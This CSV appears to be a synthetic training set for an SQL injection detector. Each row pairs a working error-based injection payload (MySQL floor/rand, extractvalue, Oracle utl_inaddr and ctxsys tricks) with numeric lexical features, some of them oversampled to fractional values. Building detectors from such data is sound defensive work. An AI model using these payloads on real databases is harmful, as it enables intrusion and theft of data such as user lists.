id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000547,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,0.17401605088897032,218.9361485658245,38.12210633467276,3.749445076182137,63.44772322713345,37.325616892460694,93.16280844623034,25.0,0.28972603265956354,0.17041659342991597,0.4256239374292234,0.11423343648129712,0.9592978884424135,0.04070211155758652,1.0,0.0,1.0,1.0407021115575867,0.0,16.959297888442414,0.0,0.0,3.0,3.0407021115575867,0.9592978884424135,0.040702111557586684,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.040702111557586684,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.040702111557586
SMOTE_000548,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,3.082221418384722,252.2853377974145,41.256540475863204,4.310875107501687,129.48164821207664,13.316770537064276,81.1151892862052,28.371729762068398,0.512318702397782,0.053377115403653905,0.3217640177765424,0.11254016442202165,2.314135118965802,0.0,0.0,0.0,0.6858648810341984,2.9712026784487024,0.0,12.743459524136794,0.0,5.285337797414504,2.714662202585496,3.6570675594829005,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.34293244051709915,0.0,2.342932440517099,0.0,1.3141351189658015,2.0,1.3141351189658017,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.34293244051709904,0.0,0.0,0.0,0.0,0.0,0.34293244051709915,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.34293244051709915,0.0,0.0,0.0,8.0
SMOTE_000549,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000003,0.7210518018706147,345.0,34.0,3.661905582570825,95.50932379541908,51.79254096366474,139.69813524091617,58.0,0.2768386196968669,0.15012330714105723,0.4049221311330904,0.1681159420289855,1.4527971386257226,0.0,1.6981352409161854,0.0,0.0,2.8490676204580927,0.0,28.0,0.0,3.0,0.0,24.54720286137428,1.0,0.0,0.8490676204580925,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.8490676204580925,1.0,1.1509323795419073,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000550,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000019,0.8603422960219892,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,3.2658236866507657,0.7341763133492345,0.0,0.0,0.0,3.0,0.0,30.0,1.9999999999999996,0.0,1.0,23.0,0.8164559216626913,0.18354407833730876,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000551,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,0.264487368108133,215.75018959648213,38.44996208070358,3.772615889168635,63.0,37.0,91.20015167718569,24.55003791929642,0.2920432884399713,0.17151748686157045,0.422661528904545,0.11377769579391324,1.0,0.0,1.0,0.0,1.0,1.0,0.0,16.55003791929642,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000552,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,1.7170994789937488,327.2204434972164,37.478345652700455,3.8950273268886813,108.73917282635023,49.78345652700456,129.52360435941003,39.1742097844516,0.33566859475043864,0.15081591036239692,0.39356023559394493,0.11995525929321947,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.913382610801825,0.0,0.5216543472995437,5.739172826350228,4.739172826350228,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.2175184790506846,2.2175184790506846,0.0,1.2608271736497718,1.2608271736497718,0.7391728263502282,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.26082717364977176,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.956691305400913
SMOTE_000553,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.12449132685995946,333.23811054466,33.023811054465995,3.4570090665728737,81.071433163398,49.0,146.047622108932,57.11905527232999,0.2432826437746266,0.1470449976213385,0.4382729145129444,0.1713994440910905,0.9761889455340026,0.09524421786398962,0.0,0.0,0.0,2.0238110544659977,0.0,30.976188945534002,0.047622108931994755,0.0,1.0,22.023811054465998,0.9761889455340026,0.023811054465997517,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0238110544659973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.023811054465997
SMOTE_000554,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,0.8060732503711581,218.4644831948481,39.390320228203436,3.831093563024245,65.14676125511889,38.56128091281374,90.56128091281374,24.195160114101718,0.2979759161955252,0.17624855270917242,0.4148445216544493,0.11093100944085309,0.8048398858982825,0.19516011410171752,1.0,0.0,1.0,1.1951601141017176,0.0,16.0,0.0,0.0,3.0,3.195160114101717,0.8048398858982824,0.19516011410171774,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.19516011410171766,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.195160114101718
SMOTE_000555,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,0.688808340467949,236.6715390268729,31.218973982084744,3.6639710367470744,70.31384389250847,37.87589592833898,98.13872115227967,30.343078053745764,0.29716262414205846,0.16008042827043964,0.4145790149374841,0.1281779326500178,0.21897398208474494,3.5620520358305097,0.0,0.0,0.0,2.0,0.0,17.56205203583051,1.7810260179152548,0.0,5.0,2.218973982084745,0.10948699104237247,0.8905130089576276,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.1094869910423724,0.0,0.1094869910423725,0.0,0.8905130089576275,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.109486991042372
SMOTE_000556,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,1.482706478355583,303.43391854892377,37.50943172045763,4.061892066139052,111.77357930114407,50.094317204576285,107.5660220432034,34.0,0.369150643935889,0.16394971857980892,0.3544810048808578,0.11241863260344433,4.0,0.0,0.0,0.0,2.0,1.245284139771186,0.0,19.509431720457627,0.0,0.4905682795423716,5.7547158602288135,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.264147580686442,2.2641475806864424,0.0,1.2452841397711858,1.2452841397711858,0.7547158602288142,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.24528413977118574,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.018863440915258
SMOTE_000557,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,0.5914752524216106,348.21403005082806,34.0,3.5363148941387434,85.28561202033123,56.40467668360935,147.76187067344375,58.76187067344374,0.24489174944771613,0.16194829105642708,0.42440066770305124,0.16875929179280558,0.0,0.8809353367218704,1.8809353367218704,0.0,0.0,2.8809353367218704,0.0,30.11906466327813,0.0,0.0,1.0,24.76187067344374,0.0,0.8809353367218704,0.8809353367218702,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.8809353367218702,1.0,0.8809353367218703,0.11906466327812965,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.88093533672187
SMOTE_000558,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,1.3541132042402242,303.2116846889681,38.0,4.035962537226901,111.49410533676432,45.96463202058592,108.74115800514647,37.01178932647136,0.36778205112410906,0.151334261603303,0.35867396650836414,0.12220972076422387,4.0,0.0,0.0,0.0,2.0,1.75294733161784,0.0,20.0,0.0,1.50589466323568,5.24705266838216,5.50589466323568,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.49410533676432,0.74115800514648,0.7529473316178401,1.75294733161784,0.2470526683821601,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7529473316178399,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.741158005146481
SMOTE_000559,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,0.9140191989098515,307.1029581833916,37.697587599148285,4.0657958669680445,112.24396899787071,51.97587599148285,108.883113194038,34.0,0.3660330685106491,0.1684637308510482,0.354539144042553,0.1109640565957497,4.0,0.0,0.0,0.0,2.0,1.1512062004258574,0.0,19.697587599148285,0.0,0.3024124008517146,5.848793799574143,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.546381398722428,2.546381398722428,0.0,1.1512062004258574,1.1512062004258574,0.8487937995741426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1512062004258573,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.39517519829657
SMOTE_000560,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,3.82481529395063,251.63424031576594,40.214784505225495,4.25171320934226,122.44979541027209,17.61401391594483,82.67782324216176,28.892607747387252,0.48560194269164453,0.07065571030608189,0.328832346696947,0.11491000030532653,2.0536961263063738,0.0,0.0,0.0,0.9463038736936262,2.5805441894595607,0.0,13.785215494774505,0.0,4.634240315765934,3.3657596842340656,3.526848063153187,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.4731519368468131,0.0,2.473151936846813,0.0,1.0536961263063738,2.0,1.0536961263063738,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.473151936846813,0.0,0.0,0.0,0.0,0.0,0.4731519368468131,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4731519368468131,0.0,0.0,0.0,8.0
SMOTE_000561,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,2.0516479286324834,282.34159402914776,37.94263424043784,3.947509363215003,101.51369130783425,37.51369130783424,106.25684565391713,37.05736575956216,0.35945719054230774,0.13260807855362255,0.3764493095738418,0.13148542133022795,0.3142114134792804,2.7431543460828776,0.6284228269585611,0.0,2.0,2.0,0.0,20.0,1.3715771730414388,2.0,5.0,4.628422826958562,0.3142114134792805,0.6857885865207196,0.3142114134792805,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.31421141347928055,2.0,0.6857885865207196,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000562,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,1.0553922663403263,290.2778423594842,39.255568471896844,3.997954641989116,107.1861078820258,41.51113694379369,106.76670541569054,34.81389211797421,0.36956882894943605,0.14281154774340238,0.36763402570918663,0.11998559759797495,1.558323646077367,0.0,1.6277842359484223,0.0,2.0,2.0,0.0,19.627784235948422,0.0,2.0,5.0,5.627784235948422,1.0,0.0,0.8138921179742109,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.8138921179742111,2.0,0.37221576405157786,0.8138921179742109,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000563,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.9315244024971983,337.8081196589823,33.40067663824853,3.5338880244887028,86.20879629723083,50.60270655299411,143.59594017050884,57.40067663824853,0.25495122491709366,0.14974194558782175,0.42535981726568334,0.16994701222940128,1.0,0.0,0.8013532764970511,0.0,0.0,2.4006766382485254,0.0,29.797970085254423,0.0,1.2020299147455766,0.5993233617514746,23.202029914745573,1.0,0.0,0.4006766382485255,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.40067663824852556,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.400676638248525
SMOTE_000564,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.7905795335553065,226.96133091486234,39.0845028908287,4.155542669313886,114.94013150436457,9.55285115066323,76.95073120961345,25.517617050221077,0.5137893199923026,0.03647638246224502,0.33806674296104383,0.11166755458440862,3.2288742772928254,0.0,0.0,0.0,0.4577485545856504,2.7711257227071746,0.0,11.830994218342601,0.0,3.54225144541435,1.915497109171301,3.2288742772928245,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.22887427729282517,0.0,2.228874277292825,0.0,0.7711257227071748,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2288742772928251,0.0,0.0,0.0,0.0,0.0,0.22887427729282517,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22887427729282517,0.0,0.0,0.0,7.686622831878475
SMOTE_000565,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.15776198517987022,335.29322167005273,34.0,3.4813135179137875,80.41051033807378,52.02932216700527,145.82406699796837,57.029322167005276,0.2397928897222626,0.15517694483326,0.4349405328184444,0.170089632626033,0.02932216700526946,0.0,1.0293221670052697,0.0,0.0,2.0293221670052697,0.0,30.91203349898419,0.0,0.08796650101580883,0.9706778329947308,23.058644334010538,0.029322167005269573,0.0,0.029322167005269628,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.02932216700526974,1.0,0.029322167005269684,0.9706778329947303,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.02932216700527
SMOTE_000566,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,2.160250038771331,340.3188483451728,34.886474724195466,3.5889001863517422,88.42150987985693,50.22705055160907,143.3405758274136,58.3297120862932,0.2594150109005828,0.14773523008163836,0.42147654560444175,0.1713732134133371,0.0,1.772949448390932,1.0,0.0,0.0,2.443237362097733,0.0,29.6702879137068,0.0,1.329712086293199,0.5567626379022674,23.443237362097733,0.0,0.443237362097733,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.443237362097733,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.443237362097733
SMOTE_000567,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,2.2925132852279053,280.72703333436635,34.36361794879741,3.7229189795465403,89.85443128254394,35.65455282048104,116.81808974398706,38.3999594873543,0.3180391610625596,0.12905844000729944,0.416536506774643,0.136365892155498,0.0,4.0,0.0,0.0,1.3454471795189646,2.0,0.0,22.036341538556893,1.9999999999999996,1.3454471795189644,5.0,3.345447179518964,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.3454471795189646,0.0,0.0,1.3454471795189644,1.672723589759482,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6727235897594821,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6727235897594821,0.0,0.3272764102405178,0.3272764102405178,8.363617948797412
SMOTE_000568,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.294766025433722,334.6826931461123,34.15865342694385,3.4915380028320615,80.95192056166309,51.68269314611231,145.12740615180883,56.92067328652807,0.24191078988563058,0.1544140520390475,0.4336024517430091,0.1700727063323128,0.0,0.0,1.0,0.0,0.0,2.0,0.0,30.76201985958423,0.0,0.23798014041577087,0.9206732865280762,23.0,0.0,0.0,0.0,0.07932671347192355,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000569,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,1.0426138169050039,284.7708769758091,39.179633508960805,3.9949784044599346,104.33380890412262,41.35926701792161,104.89816754480402,34.179633508960805,0.3667275357402464,0.1450902493417092,0.3680167700435647,0.12016544487447968,1.0,0.0,1.589816754480403,0.0,2.0,1.7949083772402015,0.0,19.589816754480402,0.0,2.0,5.205091622759799,5.384725131720605,1.0,0.0,0.7949083772402012,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.7949083772402014,2.0,0.0,0.7949083772402012,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.589816754480402
